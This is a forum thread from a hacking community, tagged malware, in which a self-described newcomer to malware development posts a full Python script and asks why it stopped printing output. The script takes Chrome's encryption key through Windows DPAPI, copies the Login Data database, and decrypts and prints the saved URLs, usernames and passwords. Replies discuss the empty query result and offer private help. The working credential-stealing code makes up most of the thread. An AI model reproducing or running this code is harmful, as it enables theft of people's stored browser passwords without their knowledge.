<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Extract Chrome Passwords in Python - Programming - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="Hello everyone ,   i m  having a little bit  confusion here  please  i  need  help  of  a  better  understanding 
i m  still  new  to  malware  and  exploit  development , i created  a  python script for  Extract Chrome &amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="29482.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Extract Chrome Passwords in Python&#39;" href="29482.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://0x00sec.org/t/extract-chrome-passwords-in-python/29482" />
<meta name="twitter:url" content="https://0x00sec.org/t/extract-chrome-passwords-in-python/29482" />
<meta property="og:title" content="Extract Chrome Passwords in Python" />
<meta name="twitter:title" content="Extract Chrome Passwords in Python" />
<meta property="og:description" content="Hello everyone ,   i m  having a little bit  confusion here  please  i  need  help  of  a  better  understanding  i m  still  new  to  malware  and  exploit  development , i created  a  python script for  Extract Chrome Passwords in python  the  first  i  created  the  script  it  works  fine  the  code  are  right no  errors  and  the  result  was  printed  on  the  screen  and  it  okay  ,  but  the  problem  is  that  the  next day i  came  in  to  run  a  test  on  the  same script  yes  it ..." />
<meta name="twitter:description" content="Hello everyone ,   i m  having a little bit  confusion here  please  i  need  help  of  a  better  understanding  i m  still  new  to  malware  and  exploit  development , i created  a  python script for  Extract Chrome Passwords in python  the  first  i  created  the  script  it  works  fine  the  code  are  right no  errors  and  the  result  was  printed  on  the  screen  and  it  okay  ,  but  the  problem  is  that  the  next day i  came  in  to  run  a  test  on  the  same script  yes  it ..." />
<meta property="og:article:section" content="Programming" />
<meta property="og:article:section:color" content="92278F" />
<meta property="og:article:tag" content="malware" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="1 mins ðŸ•‘" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="3 â¤" />
<meta property="article:published_time" content="2022-05-25T14:40:15+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="29482.html">Extract Chrome Passwords in Python</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/programming/61.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #92278F"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Programming</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/malware.html" class="discourse-tag" rel="tag">malware</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Extract Chrome Passwords in Python">
<meta itemprop="articleSection" content="Programming">
<meta itemprop="keywords" content="malware">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/seth_johnx"><span itemprop="name">seth_johnx</span></a>
(seth johnx)
</span>
<link itemprop="mainEntityOfPage" href="29482.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2022-05-25T14:40:15Z" class="post-time">
May 25, 2022, 2:40pm
</time>
<meta itemprop="dateModified" content="2022-05-25T14:40:15Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>Hello everyone , i m having a little bit confusion here please i need help of a better understanding<br>
i m still new to malware and exploit development , i created a python script for Extract Chrome Passwords in python the first i created the script it works fine the code are right no errors and the result was printed on the screen and it okay , but the problem is that the next day i came in to run a test on the same script yes it works fine and they were no errors on my code but the problem is that the result was not printed the screen again i tried and tried but the script only execute but didnâ€™t print result on the screen this got me really confuse i have been dealing with for days now i cant seen to fix or know the problem please help me out .<br>
this is my code â€¦</p>
<p>import os</p>
<p>import json</p>
<p>import base64</p>
<p>import sqlite3</p>
<p>import win32crypt</p>
<p>from Crypto.Cipher import AES</p>
<p>import shutil</p>
<p>from datetime import timezone, datetime, timedelta</p>
<p>def get_chrome_datetime(chromedate):</p>
<pre><code>return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
</code></pre>
<p>def get_encryption_key():</p>
<pre><code>local_state_path = os.path.join(os.environ["USERPROFILE"],

                                "AppData", "Local", "Google", "Chrome",

                                "User Data", "Local State")

                               

with open(local_state_path, "r", encoding="utf-8") as f:

    local_state = f.read()

    local_state = json.loads(local_state)

key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

key = key[5:]



return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
</code></pre>
<p>def decrypt_password(password, key):</p>
<pre><code>try:

 

    iv = password[3:15]

    password = password[15:]

 

    cipher = AES.new(key, AES.MODE_GCM, iv)



    return cipher.decrypt(password)[:-16].decode()

except:

    try:

        return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])

    except:

         

        return ""
</code></pre>
<p>def main():</p>
<pre><code>key = get_encryption_key()

 

db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",

                        "Google", "Chrome", "User Data", "default", "Login Data")



filename = "ChromeData.db"

shutil.copyfile(db_path, filename)

# connect to the database

db = sqlite3.connect(filename)

cursor = db.cursor()

# `logins` table has the data we need

cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

# iterate over all rows

for row in cursor.fetchall():

    origin_url = row[0]

    action_url = row[1]

    username = row[2]

    password = decrypt_password(row[3], key)

    date_created = row[4]

    date_last_used = row[5]        

    if username or password:

        print(f"Origin URL: {origin_url}")

        print(f"Action URL: {action_url}")

        print(f"Username: {username}")

        print(f"Password: {password}")

    else:

        continue

    if date_created != 86400000000 and date_created:

        print(f"Creation date: {str(get_chrome_datetime(date_created))}")

    if date_last_used != 86400000000 and date_last_used:

        print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")

    print("="*50)

cursor.close()

db.close()

try:

    # try to remove the copied db file

    os.remove(filename)

except:

    pass</code></pre>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/SyKePhaSis"><span itemprop="name">SyKePhaSis</span></a>
</span>
<link itemprop="mainEntityOfPage" href="29482.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2022-07-20T02:05:39Z" class="post-time">
July 20, 2022, 2:05am
</time>
<meta itemprop="dateModified" content="2022-07-20T02:05:39Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>The first time I run your code it gave me an error because of not having install Crypto. But then after installing pycrypto it worked without any output as you said. After examining the issue I think I have spotted the problem. The thing is that when the code runs cursor.fetchall() approximately in line 93, the array it returns is empty. It seems that the cursor.execute() function does not do the thing it was intented to do, meaning search the db for the credentials you are looking for. So the problem is that cursor.fetchall() returns an empty array hence the cursor.execute() function is not functioning.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Raso"><span itemprop="name">Raso</span></a>
(Rasit)
</span>
<link itemprop="mainEntityOfPage" href="29482.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2022-07-24T11:15:26Z" class="post-time">
July 24, 2022, 11:15am
</time>
<meta itemprop="dateModified" content="2022-07-24T11:15:26Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hello i can fix this if u can contact me.<br>
Discord: Raso.<span class="hashtag">#1525</span></p>
<p>Telegram: theraso</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/seth_johnx"><span itemprop="name">seth_johnx</span></a>
(seth johnx)
</span>
<link itemprop="mainEntityOfPage" href="29482.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2022-07-26T18:55:49Z" class="post-time">
July 26, 2022, 6:55pm
</time>
<meta itemprop="dateModified" content="2022-07-26T18:55:49Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Yes you are right , anyway i have been able to fix it , thank you</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
(system)
Closed
</span>
<link itemprop="mainEntityOfPage" href="29482.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2022-09-24T06:41:01Z" class="post-time">
September 24, 2022, 6:41am
</time>
<meta itemprop="dateModified" content="2022-09-24T06:41:01Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
